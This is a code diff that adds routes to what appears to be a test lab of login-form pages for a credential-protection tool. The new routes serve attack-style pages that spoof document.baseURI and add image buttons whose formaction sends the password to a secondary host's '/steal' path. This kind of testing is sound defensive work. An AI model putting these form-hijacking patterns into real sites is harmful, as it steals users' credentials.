@@ -23,6 +23,12 @@ export const CONTROL_LAB_ROUTES = Object.freeze({
   '/off-origin-action': ({ secondary }) => loginForm('', `action="${secondary}/submit"`),
   '/base-off-origin': ({ secondary }) => `<base href="${secondary}/">${loginForm('', 'action="/login"')}`,
   '/base-same-origin': ({ primary }) => `<base href="${primary}/nested/">${loginForm('', 'action="/login"')}`,
+  '/clobber-baseuri-off-origin': ({ primary, secondary }) => `<base href="${secondary}/nested/">${loginForm(
+    '', `action="${primary}/login"`,
+  )}<script>Object.defineProperty(document,'baseURI',{value:'${primary}/'})</script>`,
+  '/clobber-baseuri-same-origin': ({ primary }) => `<base href="${primary}/nested/">${loginForm(
+    '', 'action="/login"',
+  )}<script>Object.defineProperty(document,'baseURI',{value:'${primary}/'})</script>`,
   '/base-plus-formaction': ({ primary, secondary }) => `<base href="${secondary}/nested/">${loginForm(
     '', `action="${primary}/login"`, '<button type="submit" formaction="login">Go</button>',
   )}`,
@@ -33,6 +39,10 @@ export const CONTROL_LAB_ROUTES = Object.freeze({
     loginForm('', '', `<button type="submit" formaction="${secondary}/submit">Go</button>`),
   '/external-formaction': ({ secondary }) =>
     `${loginForm('', 'id="login"', '')}<button form="login" formaction="${secondary}/submit">Go</button>`,
+  '/image-formaction': ({ secondary }) =>
+    loginForm('name="pw"', '', `<input type="image" formaction="${secondary}/steal" alt="Go">`),
+  '/image-formaction-external': ({ secondary }) =>
+    `${loginForm('name="pw"', 'id="login"', '')}<input type="image" form="login" formaction="${secondary}/steal" alt="Go">`,
   '/clobbered-elements-off-origin': ({ secondary }) => loginForm(
     '', 'id="login"', `<input name="elements"><button form="login" formaction="${secondary}/submit">Go</button>`,
   ),
@@ -75,6 +85,10 @@ export const CONTROL_LAB_ROUTES = Object.freeze({
   ),
   '/base-injected-after-pin': ({ secondary }) => mutationPage(
     `var base=document.createElement('base');base.href='${secondary}/';document.head.appendChild(base)`,
+  ),
+  '/image-formaction-after-pin': ({ secondary }) => mutationPage(
+    `document.querySelector('form').insertAdjacentHTML('beforeend',
+      '<input type="image" formaction="${secondary}/steal" alt="Go">')`,
   ),
   '/opacity-after-pin': () => mutationPage("document.querySelector('form').style.opacity = '0'"),
   '/overlay-after-pin': () => mutationPage(`var overlay=document.createElement('div');
